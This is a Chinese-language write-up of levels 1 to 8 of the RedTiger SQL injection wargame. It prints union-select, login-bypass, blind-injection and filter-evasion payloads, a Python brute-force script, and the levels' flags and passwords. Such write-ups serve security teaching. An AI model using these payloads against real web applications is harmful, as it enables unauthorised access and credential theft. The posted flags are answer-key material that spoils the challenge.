<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 测试多少列：?cat=1 order by 4</span><br><span class="line">2. 测试显示位：?cat=-1 union select 1,2,3,4</span><br><span class="line">3. 测得数据库为hackit：?cat=-1 union select 1,2,3,database()</span><br></pre></td></tr></table></figure>
<p>如果按照常规的显示表、列会出现 <code>Some things are disabled!!!</code> 也就是被过滤了。但是考虑到表名给我们了，并且根据描述，可以猜测表内有<code>username, password</code> 两个字段。因此构造如下paylaod： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cat=-1 union select 1,2,username,password from level1_users</span><br></pre></td></tr></table></figure></p>
<p>得到用户名为：Hornoxe，密码为：thatwaseasy。成功登录： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 27cbddc803ecde822d87a7e8639f9315  </span><br><span class="line">  </span><br><span class="line">The password for the next level is: passwords_will_change_over_time_let_us_do_a_shitty_rhyme</span><br></pre></td></tr></table></figure></p>
<p>可以到wechall上提交flag，网址：https://www.wechall.net/14-levels-on-Hackit.html</p>
<h1 id="level-2">Level-2</h1>
<h2 id="题目描述-1">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318153929.png" /></p>
<p>根据描述，这道题是登录绕过。</p>
<h2 id="测试注入点-1">测试注入点</h2>
<p>分别对username和password测试，结果如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;&amp;password=123&amp;login=Login</span><br></pre></td></tr></table></figure> 对应：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318154813.png" /></p>
<p>而 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=123&#x27;&amp;login=Login</span><br></pre></td></tr></table></figure></p>
<p>对应： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318154617.png" /></p>
<p>因此注入点应该在password。</p>
<p>并且 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=123&#x27;#&amp;login=Login</span><br></pre></td></tr></table></figure></p>
<p>则不出现报错信息，只出现 <code>login incorrect!</code>。这就更加确定password为注入点。</p>
<h2 id="注入过程-1">注入过程</h2>
<p>本题为登录绕过，因此尝试万能密码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=123&#x27; or 1=1#&amp;login=Login</span><br></pre></td></tr></table></figure></p>
<p>发现成功登录： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318154759.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 1222e2d4ad5da677efb188550528bfaa  </span><br><span class="line">  </span><br><span class="line">The password for the next level is: feed_the_cat_who_eats_your_bread</span><br></pre></td></tr></table></figure>
<h1 id="level-3">Level-3</h1>
<h2 id="题目描述-2">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318154944.png" /></p>
<p>本题很有难度，注意提示 <code>try to get an error</code>。点击 <code>TheCow</code> 和 <code>Admin</code> url会出现 <code>usr</code> 参数，但是不乱是 <code>1=1</code> 还是 <code>1=2</code> 或者加单引号都不起作用，并且将原来的usr经过base64解码后得到的也只是一串数字，跟TheCow和Admin无法对上。查看大佬的writeup之后发现，需要<strong>传入数组让它报错</strong>！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318155401.png" /></p>
<p>注意 <code>/var/www/html/hackit/urlcrypt.inc</code> ，这是一个文件，输入网址：<code>http://redtiger.labs.overthewire.org/urlcrypt.inc</code> 并且查看源码得到如下代码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">// warning! ugly code ahead :)</span></span><br><span class="line">	<span class="comment">// requires php5.x, sorry for that</span></span><br><span class="line">  		</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$cryptedstr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">		srand(<span class="number">3284724</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="variable">$i</span> =<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str</span>); <span class="variable">$i</span>++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$temp</span> = ord(substr(<span class="variable">$str</span>,<span class="variable">$i</span>,<span class="number">1</span>)) ^ rand(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">while</span>(strlen(<span class="variable">$temp</span>)&lt;<span class="number">3</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="variable">$temp</span> = <span class="string">&quot;0&quot;</span>.<span class="variable">$temp</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$cryptedstr</span> .= <span class="variable">$temp</span>. <span class="string">&quot;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> base64_encode(<span class="variable">$cryptedstr</span>);</span><br><span class="line">	&#125;</span><br><span class="line">  </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">decrypt</span> (<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		srand(<span class="number">3284724</span>);</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;%^[a-zA-Z0-9/+]*=&#123;0,2&#125;$%&#x27;</span>,<span class="variable">$str</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$str</span> = base64_decode(<span class="variable">$str</span>);</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$str</span> != <span class="string">&quot;&quot;</span> &amp;&amp; <span class="variable">$str</span> != <span class="literal">null</span> &amp;&amp; <span class="variable">$str</span> != <span class="literal">false</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="variable">$decStr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str</span>); <span class="variable">$i</span>+=<span class="number">3</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="variable">$array</span>[<span class="variable">$i</span>/<span class="number">3</span>] = substr(<span class="variable">$str</span>,<span class="variable">$i</span>,<span class="number">3</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">foreach</span>(<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$s</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="variable">$a</span> = <span class="variable">$s</span> ^ rand(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">					<span class="variable">$decStr</span> .= chr(<span class="variable">$a</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">return</span> <span class="variable">$decStr</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>注意前面的提示，代码只能运行在PHP5.x 版本，太高或者太低的版本会导致最终的加密结果不对！！！</p>
<h2 id="测试注入点-2">测试注入点</h2>
<p>推荐网址，可以选择php版本：http://www.dooccn.com/php5.5/</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318160027.png" /></p>
<p>将点击Admin之后得到的usr的值代入解密发现结果正好是Admin，因此得出结论，usr就是注入点，并且需要将payload经过加密后再传入。将 <code>Admin'</code> 加密后传入，发现报错，而 <code>Admin'#</code> 加密后传入正常显示。因此闭合方式为单引号。</p>
<h2 id="注入过程-2">注入过程</h2>
<p>首先，表名已经给了，为：<code>level3_users</code>，需要获得Admin的密码，猜测字段名为：<code>password</code>。（这个网站的字段名都比较正常）因此构造payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试字段数：?usr=Admin&#x27; order by 7#  </span><br><span class="line">加密后：MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg3MjA4MTAxMTg0MTQyMDA5MTczMDA2MDY5MjMyMDY2</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试显示位：?usr=&#x27; union select 1,2,3,4,5,6,7# </span><br><span class="line">加密后：MDc2MTUxMDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0MTg3MDk1MDg0MjQzMDgzMTc3MDg5MDMzMjIzMjQzMTk0MDcyMjM2MTMwMjAzMTY2</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318160839.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">得到密码：?usr=&#x27; union select 1,2,3,4,5,6,password from level3_users wehre username=&#x27;admin&#x27;# </span><br><span class="line">加密后：MDc2MTUxMDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0MTg3MDk1MDg0MjQzMDgzMTc3MDg5MDMzMjIzMjQzMTk0MDcyMjM2MTMwMTQwMjI4MDYzMTk4MTM1MTA3MTA2MTgwMTk4MTk2MTg5MTEzMDQxMjQwMTQ0MDM2MTQwMTY5MTcyMDgzMjQ0MDg3MTQxMTE1MDY2MTUzMjE0MDk1MDM4MTgxMTY1MDQ3MTE4MDg2MTQwMDM0MDg1MTE4MTE4MDk5MjIyMjE4MDEwMTU4MjIwMDcxMDQwMjIwMjA5MDMz</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318161210.png" /></p>
<p>注意登录的时候，Username为admin，不要大写。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: a707b245a60d570d25a0449c2a516eca</span><br><span class="line"></span><br><span class="line">The password for the next level is: put_the_kitten_on_your_head</span><br></pre></td></tr></table></figure>
<h1 id="level-4">Level-4</h1>
<h2 id="题目描述-3">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318161335.png" /></p>
<p>发现给出了表名为：level4_secret， 字段名为：keyword，并且过滤了 like。</p>
<p>点击 <code>Click me</code>，url出现id=1。</p>
<h2 id="测试注入点-3">测试注入点</h2>
<p>分别用 <code>?id=1=1</code> 和 <code>?id=1=2</code> 测试，分别对应如下的结果：</p>
<ul>
<li>前者提示为：<code>Query returned 1 rows.</code></li>
<li>后者提示为：<code>Query returned 0 rows.</code></li>
</ul>
<p>因此为数字型的注入点。</p>
<h2 id="注入过程-3">注入过程</h2>
<p>注意本题是盲注。并且如果判断错误将会出现提示<code>Query returned 0 rows.</code>，而判断正确则会出现<code>Query returned 1 rows.</code>或者<code>Query returned 2 rows.</code>。因此根据错误的提示不同可以先测试以下word的长度为多少。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and length((select keyword from level4_secret limit 0,1))=21</span><br></pre></td></tr></table></figure></p>
<p>不断修改后面的值，发现长度为21，因此编写如下脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, time  </span><br><span class="line">  </span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">url = <span class="string">&#x27;http://redtiger.labs.overthewire.org/level4.php&#x27;</span>  </span><br><span class="line">header = &#123;  </span><br><span class="line">    <span class="string">&#x27;cookie&#x27;</span>: <span class="string">&#x27;level2login=passwords_will_change_over_time_let_us_do_a_shitty_rhyme; level3login=feed_the_cat_who_eats_your_bread; level4login=put_the_kitten_on_your_head&#x27;</span>  </span><br><span class="line">&#125;  </span><br><span class="line">payload = <span class="string">&#x27;1 and ascii(substr((select keyword from level4_secret limit 0,1),%d,1))=%d&#x27;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">22</span>):  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):  </span><br><span class="line">        param = &#123;  </span><br><span class="line">            <span class="string">&quot;id&quot;</span>: payload % (i, j)  </span><br><span class="line">        &#125;  </span><br><span class="line">        r = requests.get(url, params=param, headers=header)  </span><br><span class="line">        time.sleep(<span class="number">0.2</span>)  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Query returned 0 rows&quot;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">            <span class="keyword">continue</span>  </span><br><span class="line"> flag += <span class="built_in">chr</span>(j)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span> + flag)  </span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure> （本题需要注意，每次通过都会给一个<code>The password for the next level is:xxx</code> 这是用来登录的，会保存在cookie中，所以要在脚本中添加cookie，否则无法访问。可以抓包查看cookie）</p>
<p>得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">killstickswithbr1cks!</span><br></pre></td></tr></table></figure></p>
<p>成功注入。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: e8bcb79c389f5e295bac81fda9fd7cfa</span><br><span class="line"></span><br><span class="line">The password for the next level is: this_hack_it&#x27;s_old</span><br></pre></td></tr></table></figure></p>
<h1 id="level-5">Level-5</h1>
<h2 id="题目描述-4">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318165905.png" /></p>
<p>本题也是登录绕过，并且存在过滤，而且密码是经过md5加密的。</p>
<h2 id="测试注入点-4">测试注入点</h2>
<p>分别使用： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. username=1&#x27;&amp;password=1&amp;login=Login</span><br><span class="line">2. username=1&#x27;#&amp;password=1&amp;login=Login</span><br></pre></td></tr></table></figure></p>
<p>发现前者出现： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql_num_rows() expects parameter 1 to be resource, boolean given in &lt;b&gt;/var/www/html/hackit/level5.php</span><br></pre></td></tr></table></figure></p>
<p>而后者没有，说明 username为注入点，并且闭合方式为单引号。</p>
<h2 id="注入过程-4">注入过程</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试字段数：username=1&#x27; order by 2#&amp;password=1&amp;login=Login</span><br></pre></td></tr></table></figure>
<p>本题是登录绕过，所以优先尝试 <code>1' or 1=1#</code> 发现无法登录。又因为字段数为2，因此做一个猜测（这很重要，很多情况都需要猜测）：</p>
<blockquote>
<p>这两个字段一个是username，另一个是password。根据输入的username，去数据库查询是否存在该用户，如果存在该用户则返回username和password，然后将返回的password和输入的password进行对比，如果一样则登录成功，否则登陆失败。</p>
</blockquote>
<p>根据这猜测，那么我们随便查询一个不存在的用户，这样子就没有返回的结果。然后联合查询，密码字段为<code>md5(number)</code>，这样子就会返回一个结果，其中密码字段为 <code>md5(number)</code> 。如果输入的password为 <code>number</code> ，则md5加密后会与返回结果中的密码一致，从而登陆成功。所以构造如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1&#x27; union select 1,md5(1)#&amp;password=1&amp;login=Login</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">username: 1&#x27; union select 1,md5(1)#</span><br><span class="line">password: 1</span><br></pre></td></tr></table></figure></p>
<p>需要注意两点： 1. 上面所述的 number 要一样； 2. 要得到password所在的位置，要么第一个，要么第二个，尝试两次就出来了；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: ca5c3c4f0bc85af1392aef35fc1d09b3  </span><br><span class="line">  </span><br><span class="line">The password for the next level is: the_stone_is_cold</span><br></pre></td></tr></table></figure>
<h1 id="level-6">Level-6 ⭐</h1>
<h2 id="题目描述-5">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318171918.png" /></p>
<p>点击 <code>Click me</code> 发现url出现变化，多了一个 <code>user</code> 参数。</p>
<h2 id="测试注入点-5">测试注入点</h2>
<p>分别使用 <code>?user=1=1</code> 和 <code>?user=1=2</code> 进行测试，发现前者出现报错，而后者没有报错，因此user为数字型注入点。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318172316.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318172325.png" /></p>
<h2 id="注入过程-5">注入过程</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试字段数：?user=1 order by 5</span><br></pre></td></tr></table></figure>
<p>字段数为5。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试显示位：?user=-1 union select 1,2,3,4,5</span><br></pre></td></tr></table></figure></p>
<p>得到一个很奇怪的结果：<code>User not found</code>，也就是没有显示位，只是返回了user=-1的查询结果。如下payload的结果也是一样： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?user=-1 union select 1,2,3,4,5 from level6_users where status=1</span><br></pre></td></tr></table></figure></p>
<p>接下来就是随便的一些尝试，分别将 <code>admin</code>, <code>deddlef</code>, <code>username</code>,<code>password</code> 四个关键词分别带入五个位置，基本都是提示： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318191919.png" /></p>
<p>只有下面的payload有所不同： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?user=-1 union select 1,username,3,4,5 from level6_users where status=1</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318192043.png" /></p>
<h3 id="思路">思路 ⭐</h3>
<p>出现了新的显示。看了大佬的writeup，得到如下思路：</p>
<p>后台进行了二次查询，首先检查 user 参数，如果查询的 user 存在的话，则会返回结果，这个结果有5列，即5个字段。然后再将结果中的第二个字段进行查询，此时得到的结果才会最终显示出来，即上图中的 username和email。因此，真正的注入点是第二个字段。 解释： <code>user=-1 union select 1,2,3,4,5</code> 返回的结果如下：</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">字段1</th>
<th style="text-align: center;">字段2</th>
<th style="text-align: center;">字段3</th>
<th style="text-align: center;">字段4</th>
<th style="text-align: center;">字段5</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">1</td>
<td style="text-align: center;">2</td>
<td style="text-align: center;">3</td>
<td style="text-align: center;">4</td>
<td style="text-align: center;">5</td>
</tr>
</tbody>
</table>
<p>而<code>user=-1 union select 1,username,3,4,5</code> 返回的结果如下：</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">字段1</th>
<th style="text-align: center;">字段2</th>
<th style="text-align: center;">字段3</th>
<th style="text-align: center;">字段4</th>
<th style="text-align: center;">字段5</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">1</td>
<td style="text-align: center;">username</td>
<td style="text-align: center;">3</td>
<td style="text-align: center;">4</td>
<td style="text-align: center;">5</td>
</tr>
</tbody>
</table>
<p>此时字段2即为注入点，如果直接输入 admin，则会返回admin的信息。</p>
<h3 id="过程">过程</h3>
<p>所以对第二个字段进行注入，根据得到的结果，第二个字段应该是username，然后利用username进行第二次查询数据库，得到信息。</p>
<p>发现admin、(、)等都被过滤了，那么只好将字符串转为16进制尝试。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?user=-1%20union%20select%201,admin&#x27;,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后：?user=-1%20union%20select%201,0x61646d696e2723,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line"></span><br><span class="line">?user=-1%20union%20select%201,admin,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后：?user=-1%20union%20select%201,0x61646d696e27,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure></p>
<p>发现前者出现报错，而后者没有报错。说明确实在第二个字段处存在注入，接下来就是常规的注入过程。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 测试字段数：</span><br><span class="line">?user=-1%20union%20select%201,admin&#x27; order by 5#,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后:?user=-1%20union%20select%201,0x61646d696e27206f72646572206279203523,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure>
<p>发现显示字段还是5个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2. 测试显示位：</span><br><span class="line">?user=-1%20union%20select%201,&#x27; union select 1,2,3,4,5#,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后:?user=-1%20union%20select%201,0x2720756e696f6e2073656c65637420312c322c332c342c3523,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure>
<p>结果如下： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318194025.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3. 显示用户名和密码</span><br><span class="line">?user=-1%20union%20select%201,&#x27; union select 1,username,3,password,5 from level6_users where status=1#,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后:?user=-1%20union%20select%201,0x2720756e696f6e2073656c65637420312c757365726e616d652c332c70617373776f72642c352066726f6d206c6576656c365f7573657273207768657265207374617475733d3123,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure>
<p>成功得到用户名和密码： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318194406.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 074113b268d87dea21cc839954dec932</span><br><span class="line"></span><br><span class="line">The password for the next level is: shitcoins_are_hold</span><br></pre></td></tr></table></figure>
<h1 id="level-7">Level-7</h1>
<h2 id="题目描述-6">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318195333.png" /></p>
<p>题目要求：查询关于google的信息的作者，输入google发现得到一篇文章，但是没有作者。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318195818.png" /></p>
<h2 id="测试注入点-6">测试注入点</h2>
<p>输入 <code>google'</code> 发现报错信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;%&#x27; OR text.title LIKE &#x27;%google&#x27;%&#x27;)&#x27; at line 1</span><br><span class="line"></span><br><span class="line">SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE &#x27;%google&#x27;%&#x27; OR text.title LIKE &#x27;%google&#x27;%&#x27;)</span><br><span class="line"></span><br><span class="line">因此，完整的查询语句如下：SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE &#x27;%输入%&#x27; OR text.title LIKE &#x27;%输入%&#x27;)</span><br></pre></td></tr></table></figure></p>
<p>但是 <code>#</code> 、<code>空格</code> 、<code>--+</code> 都被过滤了。但是可以用 <code>%09</code> 和 <code>%a0</code> 代替，不过注意一定要在burpsuite中，不要直接在输入框中输入，否则%号会被再次url编码。其中 <code>%09</code> 为制表符，后者不太懂。</p>
<p>因此： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search=google%&#x27;)--%a0&amp;dosearch=search%21</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318203348.png" /></p>
<h2 id="注入过程-6">注入过程</h2>
<p>获取显示位： 发现 order by被过滤，不论是大小写、注释都不行。那么直接使用联合查询，如果位数不对也会报错 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search=-1%&#x27;)union select 1,2,3,4--%a0&amp;dosearch=search%21 -&gt; 四个字段</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318203641.png" /></p>
<p>获取作者名字： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search=-1%&#x27;)union select 1,2,3,autor from level7_news--%a0&amp;dosearch=search%21</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318203840.png" /></p>
<p>猜测应该是 <code>TestUserforg00gle</code>，成功。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 970cecc0355ed85306588a1a01db4d80</span><br><span class="line"></span><br><span class="line">The password for the next level is: or_so_i&#x27;m_told</span><br></pre></td></tr></table></figure>
<h1 id="level-8">Level-8</h1>
<h2 id="题目描述-7">题目描述 ⭐</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318204016.png" /></p>
<p>这道题给出的是关于 admin 的信息，还有编辑的按钮。猜测本题应该是关于数据更新的注入，即 <code>update</code> ，前面都是 <code>select</code> 的。</p>
<p><code>update</code> 的语句如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update table_name set column_name1=value1,column_name2=value2,... where column_name3=value;</span><br><span class="line"></span><br><span class="line">前面的column_name是要修改的字段，如果是字符串，则value需要加引号。后面的column_name3是用来找到需要修改的信息。</span><br></pre></td></tr></table></figure></p>
<p>需要注意的是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update table_name set column_name1=value1,column_name2=column_name4,... where column_name3=value;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318210614.png" /></p>
<p>上述语句会将字段4的值赋给字段2，本题应该考察的就是这个。</p>
<h2 id="测试注入点-7">测试注入点</h2>
<p>依次对所有的输入添加单引号，发现只有 Email 报错： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;1&#x27;, age = &#x27;1&#x27; WHERE id = 1&#x27; at line 3</span><br></pre></td></tr></table></figure></p>
<p>如果payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">email=1&#x27;&amp;name=abc&amp;icq=12345&amp;age=90&amp;edit=Edit</span><br></pre></td></tr></table></figure></p>
<p>报错信息为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;12345&#x27;,age = &#x27;90&#x27; WHERE id = 1&#x27; at line 3</span><br></pre></td></tr></table></figure></p>
<p>可以看到，被影响的只有 icq 和 age，而 name 没被影响，推测后台语句如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update tableName set name=&#x27;[input]&#x27;,emai=&#x27;[input]&#x27;,icq=&#x27;[input]&#x27;,age=&#x27;[input]&#x27; where id=1;</span><br></pre></td></tr></table></figure></p>
<h2 id="注入过程-7">注入过程</h2>
<p>上述可知，我们需要将密码的值赋给4个字段中的其中一个，有两种情况： - icq和age其中一个</p>
<p>有一个问题，这两个字段都在email的后面，要想赋值给这两个其中之一，需要在email中写完之后，将后面的所有语句注释掉。即： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">email=1&#x27;,icq=password,age=&#x27;23&#x27; where id=1;#</span><br><span class="line"></span><br><span class="line">真正查询语句为：update tableName set name=&#x27;[input]&#x27;,emai=&#x27;1&#x27;,icq=password,age=&#x27;23&#x27; where id=1;#&#x27;,icq=&#x27;[input]&#x27;,age=&#x27;[input]&#x27; where id=1;</span><br></pre></td></tr></table></figure></p>
<p>测试发现这种做法不行。报错信息为：<code>near 'icq = '12345',age = '90' WHERE id = 1'</code>。</p>
<ul>
<li>email和name其中一个</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">根据报错信息：12345&#x27;,age = &#x27;90&#x27; WHERE id = 1，需要将 icq=&#x27; 补齐</span><br><span class="line">1. email=&#x27;,email=password,icq=&#x27;</span><br><span class="line">2. email=1&#x27;,name=password,icq=&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318212222.png" /></p>
<p>成功得到密码。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 9ea04c5d4f90dae92c396cf7a6787715  </span><br><span class="line">  </span><br><span class="line">The password for the next level is: network_pancakes_milk_and_wine</span><br></pre></td></tr></table></figure></p>
<h3 id="疑惑点">疑惑点 ⭐</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. email=&#x27;</span><br><span class="line">2. email=&#x27;#</span><br></pre></td></tr></table></figure>
<p>报错信息分别为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 12345&#x27; balabala</span><br><span class="line">2. icq=&#x27;12345&#x27; balabala</span><br></pre></td></tr></table></figure></p>
<p>也就是注释符只注释了email=’‘ 中后面的单引号。前者为 <code>(email='')(',icq=')12345'</code>，括号只是为了方便看。而后者为 <code>(email='')#',icq='12345'</code>，按道理后面的都应该被注释掉了，我的猜测如下（本人php代码差，如果有误请多多批评）：</p>
